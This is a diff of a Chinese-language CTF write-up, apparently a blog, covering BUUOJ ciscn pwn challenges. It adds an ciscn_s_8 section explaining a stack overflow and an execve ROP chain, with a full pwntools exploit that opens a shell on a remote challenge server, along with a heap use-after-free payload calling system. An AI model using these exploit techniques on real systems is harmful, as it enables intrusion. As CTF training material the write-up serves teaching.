@@ -60,7 +60,7 @@ int do_new()
 
 输入`Integer`时的内存布局
 
-![](ciscn-pwn泛做/1.jpg)
+![](/images/ciscn_buu_pwn/1.jpg)
 
 对应的`rec_int_free`函数是，如果输入的是整数，那么直接`free`掉`record[id]`指向的`chunk`即可
 
@@ -74,7 +74,7 @@ int __cdecl rec_int_free(void *ptr)
 
 输入`Text`时的内存布局
 
-![](ciscn-pwn泛做/2.jpg)
+![](/images/ciscn_buu_pwn/2.jpg)
 
 对应的`rec_str_free`函数是，不仅`free`掉`record[id]`指向的`chunk`，`free`掉`ptr`指向的保存`Text`的`chunk`
 
@@ -109,17 +109,17 @@ int do_del()
 
 可以先创建两个输入`Integer`的`chunk`，即`new_note_int(0,0)`，`new_note_int(1,0)`，此时内存布局如下
 
-![](ciscn-pwn泛做/3.jpg)
+![](/images/ciscn_buu_pwn/3.jpg)
 
 然后`free`掉两个，即`del(0)`，`del(1)`
 
 此时`fastbin`中的布局如下
 
-![](ciscn-pwn泛做/4.jpg)
+![](/images/ciscn_buu_pwn/4.jpg)
 
 注意，`fastbin`是FILO即先进后出，所以我们申请一个写入长度为`0xc`的字符串即`payload=sh\x00\x00 + p32(system_plt)`。申请一个`new_note_str(2,0xc,payload)`，注意此时`record[2]`会先申请`addr2`所在的`chunk`，内容部分会申请在`addr1`所在的`chunk`
 
-![](ciscn-pwn泛做/5.jpg)
+![](/images/ciscn_buu_pwn/5.jpg)
 
 然后由于`record[0]`中的记录没有被删除，所以`del(0)`，此时会调用
 
@@ -305,3 +305,76 @@ p.interactive()
 知识点
 
 + `tcache_dup`：注意在`2.27-3ubuntu1`之后的`libc`版本不可使用
+
+## ciscn_s_8
+知识点
++ ROP(execve syscall)
++ 栈溢出
++ 输入加密处理
+
+题目
+
+首先运行以下程序，根据字符串找对应的函数
+
+![](/images/ciscn_buu_pwn/3-1670562794736.jpg)
+
+![](/images/ciscn_buu_pwn/4-1670563246093.jpg)
+
+利用思路
+
+栈溢出、没有Canary，再字符串中没有找到`/bin/sh`。在Disassembly界面`Alt T`寻找`syscall`字符串，发现有，所以考虑使用`execve`，在`x64`下，`execve`的系统调用号是$59$
+
+``` c
+int execve(const char *filename, char *const argv[], char *const envp[]);
+```
+
+`execve`有三个参数，第一个是存放了`/bin//sh`的指针，后面两个设置位`NULL`即可。那这个`/bin//sh`要存放在哪里呢？当然，可以放在栈上，但地址不容易确定。所以考虑放在`.bss`段上，在IDA用`Ctrl + s`即可查看各个段的位置。
+
+所以我们的思路是利用ROP，先在`.bss`段开头处存放`/bin//sh`，然后设置`systcall`的参数，最后调用`syscall`即可
+
+在Linux系统下`man syscall`可以方便看到不同架构下`syscall`调用的寄存器情况
+
+用汇编写就是
+
+``` asm
+mov rsi [bss]
+mov rax "/bin//sh"
+mov [rsi] rax
+mov rdi [bss]	 ;设置第一个参数
+mov rdx 0		 ;设置第三个参数
+mov rsi 0         ;设置第二个参数
+mov rax 0x3B	  ;设置系统调用号
+call syscall
+```
+
+exp
+
+``` python
+from pwn import *
+
+p=remote('node4.buuoj.cn',29457)
+context.log_level='debug'
+def encode(s):
+    res=''
+    for i in range(len(s)):
+        res += chr(s[i]^0x66)
+    return res
+pop_rdi = 0x4006e6
+pop_rdx_rsi = 0x44c179
+pop_rsi = 0x4040fe
+bss = 0x6BC2E0
+read = 0x449BE0
+puts = 0x410550
+open = 0x4102B0
+syscall = 0x40139c
+pop_rax = 0x449b9c
+mov_rax_inrsi = 0x47f7b1
+ROP = p64(pop_rsi) + p64(bss) + p64(pop_rax) + b'/bin//sh' + p64(mov_rax_inrsi) # input /bin/sh
+ROP += p64(pop_rdi) + p64(bss) + p64(pop_rdx_rsi) + p64(0)*2 + p64(pop_rax) + p64(0x3B) + p64(syscall)
+p.recvuntil("Please enter your Password: \n")
+payload = 'a'*0x50 + encode(ROP)
+p.sendline(payload)
+p.interactive()
+#flag{0b3cbb3d-891c-4f56-8b75-33f4f7d17bc7}
+```
+
